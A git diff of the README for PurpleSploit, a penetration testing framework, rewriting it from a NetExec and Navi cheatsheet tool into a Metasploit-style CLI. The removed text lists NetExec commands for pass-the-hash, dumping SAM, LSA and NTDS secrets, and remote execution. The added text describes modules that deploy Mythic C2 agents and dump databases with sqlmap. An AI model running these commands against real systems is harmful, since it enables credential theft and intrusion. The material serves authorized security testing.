@@ -1,579 +1,583 @@
-# PurpleSploit
+# PurpleSploit Framework v2.0
 
-A comprehensive penetration testing framework that combines NetExec (NXC) with an interactive command-line interface for network reconnaissance, Active Directory assessment, and web application testing.
+<div align="center">
+
+```
+╔═══════════════════════════════════════════════════════════════════════════╗
+║   ██████╗ ██╗   ██╗██████╗ ██████╗ ██╗     ███████╗███████╗██████╗       ║
+║   ██╔══██╗██║   ██║██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝██╔══██╗      ║
+║   ██████╔╝██║   ██║██████╔╝██████╔╝██║     █████╗  ███████╗██████╔╝      ║
+║   ██╔═══╝ ██║   ██║██╔══██╗██╔═══╝ ██║     ██╔══╝  ╚════██║██╔═══╝       ║
+║   ██║     ╚██████╔╝██║  ██║██║     ███████╗███████╗███████║██║           ║
+║   ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝           ║
+║                                                                           ║
+║         ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗    ║
+║         ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗   ║
+║         █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║   ║
+║         ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║   ║
+║         ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝   ║
+║         ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝    ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+```
+
+**Metasploit-Style Pentesting Framework with Intelligent Module Selection**
+
+[Quick Start](#quick-start) • [Features](#features) • [Documentation](#documentation) • [Installation](#installation)
+
+</div>
+
+---
 
 ## Overview
 
-PurpleSploit provides a unified testing platform that integrates:
-- **NetExec (NXC)**: Powerful network service exploitation and enumeration
-- **Navi**: Interactive cheatsheet system for quick command access
-- **Unified CLI**: Menu-driven interface for managing targets, credentials, and automated testing workflows
+PurpleSploit Framework is a **Metasploit-inspired pentesting framework** that unifies popular security tools under a single, intelligent interface. It combines CLI power with FZF-driven menu selection and **smart service analysis** to show only relevant modules for your targets.
+
+### Why PurpleSploit?
+
+- 🎯 **Smart Module Selection** - Automatically detects services and shows only relevant modules
+- 🔍 **FZF Integration** - Interactive menus meet Metasploit-style CLI
+- 🔐 **Multi-Credential Management** - Store and switch between credential sets
+- 🎯 **Multi-Target Tracking** - Organize targets per workspace
+- 🚀 **Mythic C2 Integration** - Automated agent deployment
+- 📦 **Modular Architecture** - Add new tools by dropping a `.psm` file
+- 🔧 **Universal Variables** - Set once, use everywhere
+
+---
+
+## Quick Start
+
+### Launch Framework
+
+```bash
+./purplesploit-framework.sh
+```
+
+### Basic Workflow
+
+```bash
+# 1. Set your target
+purplesploit> set RHOST 192.168.1.100
+
+# 2. Run a quick scan
+purplesploit> use recon/nmap/quick_scan
+purplesploit(recon/nmap/quick_scan)> run
+
+[+] Detected 5 services on 192.168.1.100
+[*] Run 'search relevant' to see applicable modules
+
+# 3. Search for ONLY relevant modules (smart!)
+purplesploit> search relevant
+
+[FZF menu shows only modules for detected services]
+- web/feroxbuster/basic_scan ✓ (HTTP detected)
+- network/nxc/smb/enum_shares ✓ (SMB detected)
+- network/nxc/rdp/screenshot ✓ (RDP detected)
+[SSH/LDAP/MSSQL modules NOT shown - not detected]
+
+# 4. Select credentials (FZF)
+purplesploit> credentials
+[Select from saved credentials]
+
+# 5. Run the module
+purplesploit> run
+```
+
+### Interactive Features
+
+All with FZF menus for point-and-click selection:
+
+```bash
+search          # Interactive module search
+search relevant # Smart: only modules for detected services
+browse          # Browse by category
+targets         # Select target from workspace
+credentials     # Select and load credentials
+workspace       # Switch workspaces
+vars            # Edit variables interactively
+history         # Browse and re-run commands
+```
+
+---
 
 ## Features
 
-### Core Capabilities
+### 🎯 Intelligent Service Analysis
 
-- **Multi-Protocol Support**: SMB, LDAP, WinRM, MSSQL, RDP, SSH, FTP
-- **Credential Management**: Store and manage multiple credential sets
-- **Target Management**: Organize network targets, web targets, and AD environments
-- **Interactive Commands**: Quick access to 200+ NXC commands via searchable cheatsheet
-- **Automated Workflows**: Execute common testing scenarios with minimal input
-- **Session Persistence**: Remember credentials and targets across sessions
+Automatically analyzes nmap scans and filters modules:
 
-### Testing Categories
+```bash
+# After running nmap scan:
+purplesploit> services
 
-#### Network Testing
-- Authentication testing (pass-the-hash, pass-the-ticket, etc.)
-- Share enumeration and file discovery
-- User and group enumeration
-- Remote command execution
-- Credential dumping (SAM, LSA, NTDS)
+Detected Services:
+Target               Port     Service
+192.168.1.100        80       http
+192.168.1.100        445      microsoft-ds
+192.168.1.100        3389     rdp
 
-#### Active Directory Testing
-- Domain enumeration
-- BloodHound data collection
-- Trust enumeration
-- Certificate Services (ADCS) discovery
-- Group Policy Object (GPO) analysis
-- Kerberos attacks
+# Smart search shows ONLY relevant modules
+purplesploit> search relevant
+[Only web, SMB, and RDP modules shown]
+```
 
-#### Vulnerability Checks
-- MS17-010 (EternalBlue)
-- Zerologon (CVE-2020-1472)
-- PetitPotam
-- NoPac
-- SMBGhost
-- PrintNightmare
+**[Read more: Service Analysis Guide](docs/SERVICE_ANALYSIS.md)**
 
-#### Web Application Testing
-- URL/target management
-- Integration with web testing tools
+### 🔍 FZF-Powered Menus
+
+Metasploit CLI + Interactive menus:
+
+- **Module Search** - Type keyword, select from filtered results
+- **Category Browser** - Browse modules organized by category
+- **Target Selection** - Click to select targets (with live ping)
+- **Credential Selection** - Click to load saved credentials
+- **Workspace Selection** - Quick workspace switching
+- **Variable Editor** - Select and edit any variable
+- **History Browser** - Select previous commands to re-run
+
+**[Read more: Features Guide](docs/FEATURES.md)**
+
+### 🔐 Multi-Credential Management
+
+Store unlimited credential sets:
+
+```bash
+# Add credentials
+credentials -a
+Username: administrator
+Password: [hidden]
+Domain: CORP.LOCAL
+
+# Select with FZF (click from list)
+credentials
+[Arrow keys, Enter to select]
+
+# Credentials auto-populate in modules
+use network/nxc/smb/enum_shares
+run  # Uses loaded credentials automatically
+```
+
+### 🚀 Mythic C2 Integration
+
+Deploy agents via NXC and Impacket:
+
+```bash
+# Configure once
+mythic configure
+Server: https://mythic.example.com
+API Key: abc123...
+
+# Deploy agent
+use c2/mythic/deploy_smb
+set MYTHIC_PAYLOAD /tmp/agent.exe
+run
+
+[+] Payload deployed - check Mythic for callback!
+```
+
+**[Read more: Mythic Integration](docs/FEATURES.md#-mythic-c2-integration)**
+
+### 📦 Module System
+
+**19 Built-in Modules:**
+
+#### Reconnaissance
+- `recon/nmap/quick_scan` - Fast port scan with auto-analysis
+- `recon/nmap/full_scan` - Full scan with service detection
+- `recon/nmap/vuln_scan` - Vulnerability scanning
+
+#### Web Testing
+- `web/feroxbuster/basic_scan` - Directory discovery
+- `web/feroxbuster/deep_scan` - Deep scan with extensions
+- `web/feroxbuster/api_discovery` - API endpoint discovery
+- `web/httpx/probe_urls` - HTTP probing
+- `web/sqlmap/basic_injection` - SQL injection testing
+- `web/sqlmap/database_dump` - Database dumping
+
+#### Network (NXC)
+- `network/nxc/smb/*` - SMB authentication, enumeration, shares, credentials
+- `network/nxc/ldap/*` - LDAP enumeration
+- `network/nxc/winrm/*` - WinRM operations
+- `network/nxc/rdp/*` - RDP operations
+
+#### C2 Deployment
+- `c2/mythic/deploy_smb` - Deploy via SMB
+- `c2/mythic/deploy_winrm` - Deploy via WinRM
+- `c2/mythic/deploy_psexec` - Deploy via PSExec
+- `c2/mythic/deploy_wmiexec` - Deploy via WMIExec
+
+**Add your own:** Drop a `.psm` file in `modules/`, framework auto-discovers it!
+
+**[Module Template](MODULE_TEMPLATE.psm)** | **[Full Module List](docs/FRAMEWORK_README.md#example-modules)**
+
+---
 
 ## Installation
 
 ### Prerequisites
 
-- Linux (Debian/Ubuntu/Kali) or macOS
-- Python 3.8+
-- Git
-- Bash
+```bash
+# Required
+- bash 4.0+
+- fzf (for interactive menus)
 
-### Quick Install
+# Optional (for specific modules)
+- nmap
+- feroxbuster
+- sqlmap
+- httpx
+- netexec (nxc)
+- impacket
+- mythic (for C2 integration)
+```
+
+### Install FZF (Recommended)
 
 ```bash
-# Clone the repository
+# Debian/Ubuntu
+sudo apt install fzf
+
+# macOS
+brew install fzf
+
+# Or manual install
+git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
+~/.fzf/install
+```
+
+### Clone Repository
+
+```bash
 git clone https://github.com/jeremylaratro/purplesploit.git
 cd purplesploit
-
-# Run the setup script
-./setup-nxc-navi.sh
+chmod +x purplesploit-framework.sh
 ```
 
-The setup script will:
-1. Install Navi (interactive cheatsheet tool)
-2. Install NetExec if not present
-3. Configure NXC cheatsheet for Navi
-4. Setup shell integration (Ctrl+G keyboard shortcut)
-5. Create configuration files
-
-### Manual Installation
-
-If you prefer manual installation:
+### Launch
 
 ```bash
-# Install NetExec
-pipx install netexec
-# or
-pip install netexec
-
-# Install Navi
-bash <(curl -sL https://raw.githubusercontent.com/denisidoro/navi/master/scripts/install)
-
-# Setup Navi cheatsheet
-mkdir -p ~/.config/navi/cheats
-cp nxc-fixed.cheat ~/.config/navi/cheats/nxc.cheat
-
-# Add shell integration to ~/.bashrc or ~/.zshrc
-eval "$(navi widget bash)"  # for bash
-eval "$(navi widget zsh)"   # for zsh
+./purplesploit-framework.sh
 ```
-
-## Usage
-
-### Interactive Framework (plat02.sh)
-
-Launch the main interactive interface:
-
-```bash
-./plat02.sh
-```
-
-#### Main Menu Options
-
-1. **Credential Management**
-   - Add/edit/delete credential sets
-   - View stored credentials
-   - Select active credentials
-
-2. **Target Management**
-   - Add network targets (IPs, ranges, subnets)
-   - Add web targets (URLs)
-   - Add AD targets (domains, DCs)
-   - Import targets from files
-
-3. **Quick Actions**
-   - Test authentication
-   - Enumerate users/groups/shares
-   - Dump credentials
-   - Execute commands
-   - Check vulnerabilities
-
-4. **Advanced Testing**
-   - Custom NXC commands
-   - Multi-target scanning
-   - Automated workflows
-
-### Navi Cheatsheet
-
-Access the interactive command cheatsheet:
-
-```bash
-# Launch Navi
-navi
-
-# Or use keyboard shortcut anywhere in terminal
-Ctrl+G
-```
-
-#### Searching Commands
-
-```bash
-# Search by keyword
-navi
-> smb enumeration
-
-# Search by protocol
-navi --tag-rules nxc,ldap
-
-# Direct query
-navi --query "dump credentials"
-
-# List all SMB commands
-navi --tag-rules nxc,smb
-```
-
-#### Common Workflows
-
-**Authenticate to Target:**
-```bash
-navi
-> Search: "test authentication"
-> Select: smb/ldap/winrm
-> Fill in: target, username, password
-> Execute
-```
-
-**Enumerate Domain Users:**
-```bash
-navi
-> Search: "enumerate users"
-> Fill in: credentials
-> Execute
-```
-
-**Dump Credentials:**
-```bash
-navi
-> Search: "dump"
-> Select: SAM, LSA, or NTDS
-> Execute
-```
-
-**Check for Vulnerabilities:**
-```bash
-navi
-> Search: "ms17-010" or "zerologon"
-> Fill in: target
-> Execute
-```
-
-## Command Reference
-
-### Authentication Methods
-
-```bash
-# Password authentication
-nxc smb <target> -u <username> -p <password>
-
-# Domain authentication
-nxc smb <target> -u <username> -p <password> -d <domain>
-
-# Pass-the-hash
-nxc smb <target> -u <username> -H <ntlm_hash>
-
-# Local authentication
-nxc smb <target> -u <username> -p <password> --local-auth
-
-# Anonymous/null session
-nxc smb <target> -u '' -p ''
-```
-
-### Enumeration
-
-```bash
-# List shares
-nxc smb <target> -u <user> -p <pass> --shares
-
-# Enumerate users
-nxc smb <target> -u <user> -p <pass> --users
-
-# Enumerate groups
-nxc smb <target> -u <user> -p <pass> --groups
-
-# Get password policy
-nxc smb <target> -u <user> -p <pass> --pass-pol
-
-# List logged-on users
-nxc smb <target> -u <user> -p <pass> --loggedon-users
-```
-
-### Credential Dumping
-
-```bash
-# Dump SAM database
-nxc smb <target> -u <user> -p <pass> --sam
-
-# Dump LSA secrets
-nxc smb <target> -u <user> -p <pass> --lsa
-
-# Dump NTDS.dit (Domain Controller)
-nxc smb <target> -u <user> -p <pass> --ntds
-
-# Extract with lsassy module
-nxc smb <target> -u <user> -p <pass> -M lsassy
-```
-
-### Remote Execution
-
-```bash
-# Execute command
-nxc smb <target> -u <user> -p <pass> -x 'whoami'
-
-# Execute PowerShell
-nxc smb <target> -u <user> -p <pass> -X 'Get-Process'
-
-# WinRM execution
-nxc winrm <target> -u <user> -p <pass> -x 'systeminfo'
-```
-
-### Advanced Features
-
-```bash
-# Spider shares for files
-nxc smb <target> -u <user> -p <pass> -M spider_plus
-
-# Collect BloodHound data
-nxc ldap <target> -u <user> -p <pass> -d <domain> -M bloodhound -o COLLECTION=All
-
-# Check for MS17-010
-nxc smb <target> -M ms17-010
-
-# Scan subnet
-nxc smb 192.168.1.0/24 -u <user> -p <pass>
-
-# Generate relay target list
-nxc smb <subnet> --gen-relay-list relay_targets.txt
-```
-
-## Configuration
-
-### Database Files
-
-PurpleSploit stores data in your home directory:
-
-- `~/.pentest-credentials.db` - Stored credentials
-- `~/.pentest-targets.db` - Network targets
-- `~/.pentest-web-targets.db` - Web targets
-- `~/.pentest-ad-targets.db` - Active Directory targets
-
-### Navi Configuration
-
-- Config: `~/.config/navi/config.yaml`
-- Cheatsheet: `~/.config/navi/cheats/nxc.cheat`
-
-Edit cheatsheet:
-```bash
-nano ~/.config/navi/cheats/nxc.cheat
-```
-
-### Shell Integration
-
-Add to your shell RC file for Ctrl+G keyboard shortcut:
-
-```bash
-# Bash (~/.bashrc)
-eval "$(navi widget bash)"
-
-# Zsh (~/.zshrc)
-eval "$(navi widget zsh)"
-
-# Fish (~/.config/fish/config.fish)
-navi widget fish | source
-```
-
-## Examples
-
-### Example 1: Domain Enumeration
-
-```bash
-# Launch framework
-./plat02.sh
-
-# Add credentials
-> Add New Credential
-  Name: DomainAdmin
-  Username: administrator
-  Password: P@ssw0rd123
-  Domain: CORP
-
-# Add target
-> Add New Target
-  Name: DC01
-  Target: 192.168.1.10
-
-# Select and test
-> Select credential and target
-> Run: Enumerate Users
-```
-
-### Example 2: Credential Dumping
-
-```bash
-# Use Navi for quick command
-navi
-
-# Search
-> "dump credentials"
-
-# Select option
-> nxc smb <target> -u <user> -p <pass> --sam --lsa
-
-# Fill in values and execute
-```
-
-### Example 3: Subnet Scanning
-
-```bash
-nxc smb 192.168.1.0/24 -u administrator -p 'P@ssw0rd123' --shares
-```
-
-### Example 4: BloodHound Collection
-
-```bash
-nxc ldap 192.168.1.10 -u administrator -p 'P@ssw0rd123' -d CORP.LOCAL -M bloodhound -o COLLECTION=All
-```
-
-## Keyboard Shortcuts
-
-### Navi Shortcuts
-- `Ctrl+G` - Open Navi from anywhere in terminal
-- `Ctrl+R` - Alternative shortcut (if configured)
-- `Ctrl+C` - Cancel/Exit
-- `Tab` - Navigate between input fields
-- `Enter` - Execute command
-- `Esc` - Go back
-
-### Framework Shortcuts
-- Arrow keys - Navigate menus
-- Enter - Select option
-- `q` or Ctrl+C - Exit/Back
-
-## Troubleshooting
-
-### Navi not found
-```bash
-# Reload shell configuration
-source ~/.bashrc  # or ~/.zshrc
-
-# Or restart your terminal
-```
-
-### Cheatsheet not showing
-```bash
-# Check if cheatsheet exists
-ls ~/.config/navi/cheats/nxc.cheat
-
-# Browse navi repositories
-navi repo browse
-```
-
-### Ctrl+G not working
-```bash
-# Add to your shell RC file
-echo 'eval "$(navi widget bash)"' >> ~/.bashrc
-source ~/.bashrc
-```
-
-### NetExec not found
-```bash
-# Install with pipx (recommended)
-pipx install netexec
-
-# Or with pip
-pip install netexec --break-system-packages
-```
-
-### Permission denied on database files
-```bash
-# Fix permissions
-chmod 600 ~/.pentest-*.db
-```
-
-## Best Practices
-
-### Security
-- Store credentials securely - database files are chmod 600
-- Clear credential history after engagements
-- Use dedicated testing systems
-- Follow responsible disclosure practices
-
-### Workflow
-- Document findings as you go
-- Use descriptive names for targets and credentials
-- Leverage session persistence for efficiency
-- Validate results with multiple methods
-
-### Performance
-- Use specific protocols when possible
-- Limit concurrent connections for stability
-- Use smaller target ranges for initial testing
-- Save output to files for later analysis
-
-## Advanced Usage
-
-### Custom Modules
-
-Add custom NXC modules to your cheatsheet:
-
-```bash
-nano ~/.config/navi/cheats/nxc.cheat
-```
-
-Format:
-```
-% nxc, custom, tag
-
-# Description of command
-nxc <protocol> <target> -u <username> -p <password> -M <module>
-
-$ target: echo "192.168.1.10"
-$ username: echo "admin"
-$ password: echo "password"
-$ module: echo "custom_module"
-```
-
-### Scripting
-
-Use the framework in scripts:
-
-```bash
-#!/bin/bash
-# Automated domain assessment
-
-# Source the framework functions
-source plat02.sh
-
-# Add target programmatically
-echo "DC01|192.168.1.10" >> ~/.pentest-targets.db
-
-# Run NXC commands
-nxc smb 192.168.1.10 -u admin -p pass --users > users.txt
-nxc smb 192.168.1.10 -u admin -p pass --groups > groups.txt
-```
-
-### Output Management
-
-```bash
-# Log to file
-nxc smb <target> -u <user> -p <pass> --log output.log
-
-# Export to CSV
-nxc smb <target> -u <user> -p <pass> --shares --export shares.csv
-
-# Verbose output
-nxc smb <target> -u <user> -p <pass> -v
-
-# Debug mode
-nxc smb <target> -u <user> -p <pass> -vv
-```
-
-## Documentation
-
-- **QUICKSTART.txt** - Quick reference guide for Navi commands
-- **nxc-fixed.cheat** - Complete NXC command cheatsheet
-- **setup-nxc-navi.sh** - Installation script source code
-
-## Resources
-
-### Official Documentation
-- [NetExec Wiki](https://www.netexec.wiki/)
-- [NetExec GitHub](https://github.com/Pennyw0rth/NetExec)
-- [Navi GitHub](https://github.com/denisidoro/navi)
-
-### Learning Resources
-- Windows Active Directory fundamentals
-- Network penetration testing methodologies
-- SMB protocol and authentication mechanisms
-- LDAP and Kerberos authentication
-
-## Contributing
-
-Contributions are welcome! Areas for contribution:
-- Additional NXC command templates
-- New modules for plat02.sh
-- Documentation improvements
-- Bug fixes
-- Feature requests
-
-## License
-
-This project is for educational and authorized testing purposes only. Users are responsible for ensuring they have proper authorization before testing any systems.
-
-## Disclaimer
-
-**IMPORTANT**: This tool is designed for authorized security testing only. Use of this tool for attacking targets without prior mutual consent is illegal. The developers assume no liability and are not responsible for any misuse or damage caused by this program.
-
-Only use this tool on systems you own or have explicit written permission to test.
-
-## Author
-
-Jeremy Laratro
-
-## Version
-
-Current Version: 4.0
-
-## Changelog
-
-### v4.0
-- Integrated web testing and network testing frameworks
-- Added Active Directory target management
-- Enhanced credential management
-- Added keyboard shortcuts
-- Improved menu navigation
-
-### v3.0
-- Added Navi integration
-- Created comprehensive NXC cheatsheet
-- Added automated setup script
-
-### v2.0
-- Initial unified CLI framework
-- Basic target and credential management
-
-### v1.0
-- Initial release
 
 ---
 
-**Happy Testing!** Press `Ctrl+G` to start using the interactive cheatsheet, or run `./plat02.sh` to launch the framework.
+## Documentation
+
+### Core Documentation
+
+- **[Framework Guide](docs/FRAMEWORK_README.md)** - Complete framework documentation
+- **[Features Guide](docs/FEATURES.md)** - FZF, credentials, Mythic C2
+- **[Service Analysis](docs/SERVICE_ANALYSIS.md)** - Smart module selection guide
+- **[Module Template](MODULE_TEMPLATE.psm)** - Create your own modules
+
+### Legacy (Lite Version)
+
+The "lite" version (TUI-based) is preserved in `purplesploit.sh`:
+
+```bash
+./purplesploit.sh  # Launch lite version
+```
+
+- **[Legacy Documentation](docs/legacy/)** - Original lite version docs
+
+---
+
+## Command Reference
+
+### Module Commands
+
+| Command | Description |
+|---------|-------------|
+| `use <module>` | Select a module |
+| `search [keyword]` | 🔍 Interactive search |
+| `search relevant` | 🎯 Smart: modules for detected services |
+| `browse` | 🔍 Browse by category |
+| `back` | Deselect module |
+| `info` | Show module details |
+
+### Smart Analysis
+
+| Command | Description |
+|---------|-------------|
+| `search relevant` | Show only modules for detected services |
+| `services` | List detected services |
+| `services -t` | Services on current target |
+
+### Target & Credential Management
+
+| Command | Description |
+|---------|-------------|
+| `targets` | 🔍 Select target (FZF) |
+| `targets -a <ip>` | Add target |
+| `credentials` | 🔍 Select credentials (FZF) |
+| `credentials -a` | Add new credential |
+| `workspace` | 🔍 Select workspace (FZF) |
+
+### Execution
+
+| Command | Description |
+|---------|-------------|
+| `run` | Execute module |
+| `run -y` | Execute without confirmation |
+| `run -j` | Execute in background |
+| `check` | Preview command |
+
+### Variables
+
+| Command | Description |
+|---------|-------------|
+| `set <VAR> <value>` | Set variable |
+| `vars` | 🔍 Interactive editor |
+| `show options` | Module options |
+| `show vars` | All variables |
+
+**Full command list:** Type `help` in framework
+
+---
+
+## Usage Examples
+
+### Scenario 1: Quick Web Assessment
+
+```bash
+purplesploit> set TARGET_URL https://target.com
+purplesploit> search ferox
+[Select web/feroxbuster/deep_scan from menu]
+purplesploit> vars  # Edit THREADS, WORDLIST, etc.
+purplesploit> run
+```
+
+### Scenario 2: Internal Network Pentest
+
+```bash
+# Create workspace
+purplesploit> workspace -a acme_internal
+
+# Add targets
+purplesploit> targets -i targets.txt
+
+# Scan target
+purplesploit> targets  # FZF select first target
+purplesploit> use recon/nmap/full_scan
+purplesploit> run
+
+# Smart module selection
+purplesploit> search relevant
+[Only shows modules for detected services]
+
+# Load credentials and attack
+purplesploit> credentials  # FZF select admin creds
+purplesploit> run
+```
+
+### Scenario 3: Automated C2 Deployment
+
+```bash
+# Configure Mythic once
+purplesploit> mythic configure
+
+# Deploy to target
+purplesploit> use c2/mythic/deploy_smb
+purplesploit> set RHOST 192.168.1.100
+purplesploit> set MYTHIC_PAYLOAD /tmp/agent.exe
+purplesploit> credentials  # Select domain admin
+purplesploit> run
+
+[+] Payload deployed via SMB
+[*] Check Mythic for callback
+```
+
+---
+
+## Architecture
+
+```
+purplesploit/
+├── purplesploit-framework.sh    # Main entry point (Full version)
+├── purplesploit.sh              # Lite version (legacy)
+├── MODULE_TEMPLATE.psm          # Template for new modules
+│
+├── framework/                   # Framework core
+│   └── core/
+│       ├── engine.sh            # Main engine
+│       ├── variable_manager.sh  # Universal variables
+│       ├── module_registry.sh   # Module discovery
+│       ├── command_engine.sh    # Command execution
+│       ├── workspace_manager.sh # Workspace management
+│       ├── fzf_integration.sh   # FZF menus
+│       ├── credential_manager.sh# Credential database
+│       ├── mythic_integration.sh# Mythic C2 support
+│       └── service_analyzer.sh  # Smart service detection
+│
+├── modules/                     # Tool modules (.psm files)
+│   ├── recon/
+│   │   └── nmap/
+│   ├── web/
+│   │   ├── feroxbuster/
+│   │   ├── sqlmap/
+│   │   └── httpx/
+│   ├── network/
+│   │   └── nxc/
+│   └── c2/
+│       └── mythic/
+│
+└── docs/                        # Documentation
+    ├── FRAMEWORK_README.md      # Full framework guide
+    ├── FEATURES.md              # Feature documentation
+    ├── SERVICE_ANALYSIS.md      # Service analysis guide
+    └── legacy/                  # Old lite version docs
+```
+
+---
+
+## Creating Custom Modules
+
+Add any tool in 5 minutes:
+
+**1. Create module file:** `modules/category/tool/action.psm`
+
+```bash
+#!/bin/bash
+MODULE_NAME="web/nuclei/basic_scan"
+MODULE_CATEGORY="web"
+MODULE_DESCRIPTION="Nuclei vulnerability scan"
+MODULE_AUTHOR="Your Name"
+MODULE_TOOL="nuclei"
+
+REQUIRED_VARS="TARGET_URL"
+OPTIONAL_VARS="THREADS:50,TEMPLATES:"
+
+COMMAND_TEMPLATE="nuclei -u \${TARGET_URL} -t \${TEMPLATES} -c \${THREADS}"
+```
+
+**2. Restart framework** - Auto-discovered!
+
+**3. Use it:**
+
+```bash
+purplesploit> search nuclei
+purplesploit> use web/nuclei/basic_scan
+purplesploit> run
+```
+
+**[Full Module Creation Guide](docs/FRAMEWORK_README.md#adding-custom-modules)**
+
+---
+
+## Data Storage
+
+### Locations
+
+- **Workspaces:** `~/.purplesploit/workspaces/`
+- **Credentials:** `~/.purplesploit/credentials.db`
+- **Services:** `~/.purplesploit/workspaces/<workspace>/services.db`
+- **Command History:** `~/.purplesploit/command_history`
+- **Mythic Config:** `~/.purplesploit/mythic_config`
+- **Job Logs:** `~/.purplesploit/jobs/`
+
+### Per-Workspace Structure
+
+```
+~/.purplesploit/workspaces/<workspace>/
+├── targets/
+│   └── hosts.txt           # Target list
+├── services.db             # Detected services
+├── output/                 # Module outputs
+├── logs/                   # Execution logs
+├── data/                   # Misc data
+└── vars.conf               # Workspace variables
+```
+
+---
+
+## Lite vs Full Version
+
+| Feature | Lite (purplesploit.sh) | Full (purplesploit-framework.sh) |
+|---------|------------------------|----------------------------------|
+| Interface | TUI menus | Metasploit CLI + FZF |
+| Variables | Per-tool | Universal system |
+| Adding Tools | Edit multiple files | Drop 1 .psm file |
+| Service Analysis | Manual | Automatic |
+| Smart Search | No | Yes (search relevant) |
+| Credentials | Basic | Multi-credential DB |
+| Mythic C2 | No | Yes |
+| Scalability | Medium | Extremely high |
+
+**Both versions available!** Use `purplesploit.sh` for TUI or `purplesploit-framework.sh` for full features.
+
+---
+
+## Contributing
+
+See **[CONTRIBUTING.md](docs/CONTRIBUTING.md)** for guidelines.
+
+**Ways to contribute:**
+- Add new modules (drop a `.psm` file!)
+- Improve service detection mappings
+- Add output parsers
+- Report bugs
+- Improve documentation
+
+---
+
+## Troubleshooting
+
+### FZF Not Working
+
+**Problem:** Commands fall back to basic mode
+
+**Solution:**
+```bash
+sudo apt install fzf  # or brew install fzf
+```
+
+### No Services Detected
+
+**Problem:** `search relevant` says no services
+
+**Solution:**
+```bash
+# Run nmap scan first
+use recon/nmap/quick_scan
+set RHOST <target>
+run
+
+# Then search
+search relevant
+```
+
+### Module Not Found
+
+**Problem:** Custom module not appearing
+
+**Solution:**
+```bash
+# Check module file name ends in .psm
+# Check MODULE_NAME is set correctly
+# Restart framework to re-scan modules
+```
+
+**[Full Troubleshooting Guide](docs/FEATURES.md#-troubleshooting)**
+
+---
+
+## Credits
+
+- **Framework:** PurpleSploit Team
+- **Tools:** nmap, feroxbuster, sqlmap, NetExec, Impacket, Mythic, and respective authors
+- **Inspired by:** Metasploit Framework
+
+---
+
+## License
+
+MIT License - See LICENSE file
+
+---
+
+<div align="center">
+
+**🟣 Happy Hacking! 🟣**
+
+[Documentation](docs/) • [GitHub Issues](https://github.com/jeremylaratro/purplesploit/issues) • [Module Template](MODULE_TEMPLATE.psm)
+
+</div>
